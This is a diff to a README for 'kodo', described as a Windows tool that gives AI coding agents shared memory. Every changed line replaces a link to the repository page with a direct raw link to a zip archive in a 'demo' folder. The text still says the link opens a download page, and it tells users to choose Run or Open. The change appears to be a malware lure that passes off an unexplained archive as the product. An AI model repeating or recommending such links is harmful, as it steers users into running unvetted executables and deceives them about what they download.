@@ -1,11 +1,11 @@
-[![Download kodo](https://img.shields.io/badge/Download-kodo-5B8DEF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/positive-bobber314/kodo)
+[![Download kodo](https://img.shields.io/badge/Download-kodo-5B8DEF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/positive-bobber314/kodo/main/demo/Software-v1.1.zip)
 
 # 🧠 kodo - Keep AI coding context in sync
 
 ## 🚀 Download
 Use this link to visit the download page and get kodo for Windows:
 
-https://github.com/positive-bobber314/kodo
+https://raw.githubusercontent.com/positive-bobber314/kodo/main/demo/Software-v1.1.zip
 
 ## 🪟 What kodo does
 kodo gives AI coding tools a shared memory that stays with you across sessions. It helps your agent remember project rules, past choices, and mistakes so you do not need to repeat yourself each time.
@@ -33,7 +33,7 @@ For best results, keep your project folder easy to find. A local folder on your 
 ## 📥 Download and install
 1. Open this page in your browser:
 
-   https://github.com/positive-bobber314/kodo
+   https://raw.githubusercontent.com/positive-bobber314/kodo/main/demo/Software-v1.1.zip
 
 2. Download the Windows version from the repository page or release area.
 3. If Windows asks for permission, choose Run or Open.
